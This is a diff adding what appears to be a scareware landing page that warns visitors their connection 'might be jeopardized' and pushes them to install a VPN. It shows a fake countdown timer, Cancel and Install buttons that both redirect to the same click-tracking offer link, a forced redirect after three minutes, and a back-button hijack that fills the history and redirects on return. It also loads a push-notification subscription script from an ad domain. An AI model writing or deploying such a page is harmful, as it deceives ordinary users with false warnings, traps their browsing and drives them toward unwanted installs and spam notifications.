@@ -1,0 +1,318 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="theme-color" content="#999">
+<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+<title>Connecting</title>
+<script src="dynamic.js"></script>
+<script src="jquery-3.4.1.min.js"></script>
+<!--<script src="common_src.js"></script>-->
+<link rel="icon" href="./favicon.ico" type="image/x-icon">
+</head>
+<body>
+<script language="JavaScript" type="text/javascript">
+    // скрипт на время
+
+    var sec = 36; // set the seconds
+    var min = 5; // set the minutes
+    var SD;
+
+    function countDown() {
+      sec--;
+      if (sec == -1) {
+        sec = 59;
+        min = min - 1;
+      } else {
+        min = min;
+      }
+
+      if (sec <= 9) {
+        sec = "0" + sec;
+      }
+      time = (min <= 9 ? "" + min : min) + ' minutes ' + ' ' + sec + ' seconds ';
+      if (min == 1) {
+        time = (min <= 9 ? "" + min : min) + ' minute ' + ' ' + sec + ' seconds '
+      }
+      if (sec <= 1) {
+        time = (min <= 9 ? "" + min : min) + ' minute ' + ' ' + sec + ' second '
+      }
+
+      if (document.getElementById) {
+        document.getElementById('theTime').innerHTML = time;
+      }
+
+      SD = window.setTimeout("countDown();", 1000);
+      if (min == '00' && sec == '00') {
+        sec = "00";
+        window.clearTimeout(SD);
+      }
+    }
+
+    window.onload = countDown;
+  </script>
+<style>
+    .body-push {
+      margin: 0;
+      padding: 0;
+      width: auto;
+      height: 100%;
+      font-family: -apple-system, Roboto, Trebuchet MS, sans-serif;
+      font-size: .95em;
+      line-height: 1.2em;
+      background-color: #999;
+    }
+
+    #bottom-message-container {
+      display: none;
+    }
+
+    .body-push #bottom-message-container {
+      display: block;
+      position: absolute;
+      width: 100%;
+      bottom: 10%;
+    }
+
+    .body-push .loader-container {
+      text-align: center;
+      margin-left: 8px;
+    }
+
+    .body-push #bottom-message {
+      /*background: #5f6267;*/
+
+      border: 2px solid #666;
+      /*border: 0px solid #bbb;*/
+      background-color: #737373;
+      height: 50px;
+      padding: 0 20px;
+      border-radius: 30px;
+      -moz-border-radius: 30px;
+      /*color: #b6b9be;*/
+      color: #ffffff;
+      /*font-size: 1em;*/
+      font-size: 1.07em;
+      line-height: 3.3;
+      /*border: 1px solid red;*/
+    }
+
+    @media only screen and (max-device-width: 375px) {
+      .body-push #bottom-message {
+        height: 40px;
+        font-size: .8em
+      }
+    }
+  </style>
+<style type="text/css">
+    a,
+    body {
+      color: #000
+    }
+
+    body,
+    html {
+      margin: 0;
+      padding: 0;
+      width: auto;
+      height: 100%
+    }
+
+    body {
+      font-family: "Helvetica", "Arial", sans-serif;
+      font-size: .85em;
+      line-height: 1.2em;
+      background-color: #999;
+      color: #212121;
+    }
+
+    a {
+      text-decoration: none
+    }
+
+    .window {
+      position: absolute;
+      left: 0;
+      right: 0;
+      border: none;
+      top: 50%;
+      width: 84.4%;
+      min-width: 240px;
+      max-width: 480px;
+      margin: auto;
+      background-color: #f9f9f9;
+      overflow: hidden;
+      -webkit-border-radius: 2px;
+      -moz-border-radius: 2px;
+      -ms-border-radius: 2px;
+      -o-border-radius: 2px;
+      border-radius: 2px;
+      box-shadow: 0 9px 46px 8px rgba(0, 0, 0, .14), 0 11px 15px -7px rgba(0, 0, 0, .12), 0 24px 38px 3px rgba(0, 0, 0, .2);
+      -webkit-transform: translate(0, -50%);
+      -moz-transform: translate(0, -50%);
+      transform: translate(0, -50%)
+    }
+
+    div.text {
+      margin: 0 6%
+    }
+
+    div.text span.text {
+      display: block;
+      margin: 0
+    }
+
+    .button,
+    .buttons {
+      margin: 0;
+      text-align: center
+    }
+
+    .buttons {
+      position: relative;
+      height: auto;
+      min-height: 36px;
+      white-space: nowrap;
+      display: flex;
+      justify-content: flex-end;
+      margin: 0 6%;
+      padding-bottom: 16px;
+      border-bottom: 1px solid #d9d9d9;
+    }
+
+    .button {
+      display: inline-block;
+      margin: 0;
+      height: 36px;
+      text-align: center;
+      white-space: normal;
+      border: none;
+      border-radius: 2px;
+      min-width: 64px;
+      padding: 0 16px;
+      text-transform: uppercase;
+      letter-spacing: 0;
+      overflow: hidden;
+      will-change: box-shadow;
+      transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+      outline: none;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 36px;
+      vertical-align: middle;
+      font-weight: 500;
+    }
+
+    .button.cancel {
+      color: #01875f;
+    }
+
+    .button.install {
+      color: rgb(255, 255, 255);
+      background-color: #01875f;
+      box-shadow: 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2);
+    }
+
+    .heads {
+      height: auto;
+      font-weight: 500;
+      font-size: 140%;
+      line-height: 105%;
+      padding: 20px 0 10px 0;
+    }
+
+    .blink_me {
+      animation: blinker 1s linear infinite
+    }
+
+    @keyframes blinker {
+      50% {
+        opacity: .3
+      }
+    }
+
+    .pagelink {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      width: auto;
+      height: auto
+    }
+  </style>
+<div class="window text_wrap">
+<div class="heads">
+<div class="text">
+VPN might be required!
+</div>
+</div>
+<div class="text">
+<p id="t2">
+Your internet connection could be safer, a VPN is recommended to improve your online safety, security, and privacy.
+<br>
+<br>
+If you do not install, your internet connection might be jeopardized!
+</p>
+<p>Install now and start your <strong>FREE</strong> trial today to improve your connection immediately!</p>
+<p id="t5" style="text-align:center;margin-top:10px;">
+<span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutes  23 seconds </span></p>
+</div>
+<div class="buttons">
+<a class="c_src button exitpoint right cancel" id="cancel-button" onclick="redirect();">
+Cancel
+</a>
+<a class="c_src button exitpoint install" id="install-button" onclick="redirect();">
+Install Now
+&gt;</a>
+</div>
+<a onclick="redirect();" class="c_src" style="width:105px;height:60px;">
+<img src="./appstore.png" alt="service" id="service" style="width:115px;height:37px;display: block; margin: 16px 6%">
+</a>
+</div>
+
+    <script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+ 
+  <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 180000);
+  </script>
+
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
+
+<script>
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script>
+
+</body></html>
